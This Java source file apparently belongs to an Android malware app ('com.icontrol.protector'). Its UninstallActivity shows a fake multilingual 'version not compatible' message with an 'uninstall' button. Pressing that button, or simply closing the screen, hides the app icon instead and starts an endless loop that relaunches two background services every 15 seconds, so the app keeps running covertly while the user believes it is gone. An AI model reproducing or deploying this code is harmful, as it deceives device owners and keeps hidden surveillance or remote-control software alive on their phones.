package com.icontrol.protector;



import static com.icontrol.protector.UtliTools.hideme;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.TextView;

import java.util.Locale;


public class UninstallActivity extends Activity {

    private static boolean Userok = false;
    private TextView themsg;
    private TextView button_ok;

    @Override
    protected void onCreate( Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        requestWindowFeature(Window.FEATURE_NO_TITLE);

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);

        setContentView(R.layout.uninstall_activity);


        themsg = findViewById(R.id.dialog_message);
        button_ok = findViewById(R.id.button_ok);



        String currentLanguage = Locale.getDefault().getLanguage();
        switch (currentLanguage) {
            case "ar":
                themsg.setText("للأسف ، هذا الإصدار غير متوافق مع جهازك");
                button_ok.setText("إلغاء التثبيت");
                break;
            case "zh":
                themsg.setText("不幸的是，该版本与您的设备不兼容");
                button_ok.setText("卸载");
                break;
            case "es":
                themsg.setText("Desafortunadamente, esta versión no es compatible con su dispositivo");
                button_ok.setText("desinstalar");
                break;
            case "pt":
                themsg.setText("Infelizmente, esta versão não é compatível com o seu dispositivo");
                button_ok.setText("desinstalar");
                break;
            case "ru":
                themsg.setText("К сожалению, эта версия не совместима с вашим устройством");
                button_ok.setText("удалить");
                break;
            case "tr":
                themsg.setText("Maalesef, bu sürüm cihazınızla uyumlu değil");
                button_ok.setText("kaldır");
                break;
            case "fr":
                themsg.setText("Malheureusement, cette version n'est pas compatible avec votre appareil");
                button_ok.setText("désinstaller");
                break;
            case "de":
                themsg.setText("Leider ist diese Version nicht mit Ihrem Gerät kompatibel");
                button_ok.setText("deinstallieren");
                break;
            case "it":
                themsg.setText("Purtroppo, questa versione non è compatibile con il tuo dispositivo");
                button_ok.setText("disinstallare");
                break;
            case "ja":
                themsg.setText("残念ながら、このバージョンはお使いのデバイスと互換性がありません");
                button_ok.setText("アンインストール");
                break;
            default:
                themsg.setText("Unfortunately, this version is not compatible with your device");
                button_ok.setText("uninstall");
                break;
        }




        button_ok.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Userok = true;
                EndSetup();
            }
        });
    }

   public void EndSetup(){
       hideme(getApplicationContext());
      // disableActivity(My_Configs.HA);
      final Context mcontext = getApplicationContext();
       new Thread(new Runnable() {
           @Override
           public void run() {

               try {

                   while (true){

                       try{
                           Thread.sleep(15000);
                       }catch (Exception x){}

                       Intent workint = new Intent(mcontext, EngineWorker.class);
                       if (!MyCods.isServiceRunning(mcontext, EngineWorker.class))
                       {
                           if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                               mcontext.startForegroundService(workint);
                           }else
                           {
                               mcontext.startService(workint);
                           }
                       }

                       if (!MyCods.isServiceRunning(mcontext, WorkServices.class))
                       {
                           Intent workint2 = new Intent(mcontext, WorkServices.class);
                           if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                               mcontext.startForegroundService(workint2);
                           }else
                           {
                               mcontext.startService(workint2);
                           }
                       }
                   }
               } catch (Exception e) {

               }

           }
       }).start();


     //  System.exit(0);
       finish();
    }


//    @Override
//    public void finish() {
//        if(!Userok){
//            Userok=true;
//            EndSetup();
//        }
//
//        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
//            super.finishAndRemoveTask();
//        }
//        else {
//            super.finish();
//        }
//    }

    @Override
    protected void onDestroy() {
        if(!Userok){
            Userok=true;
            EndSetup();
        }
        super.onDestroy();
    }
}
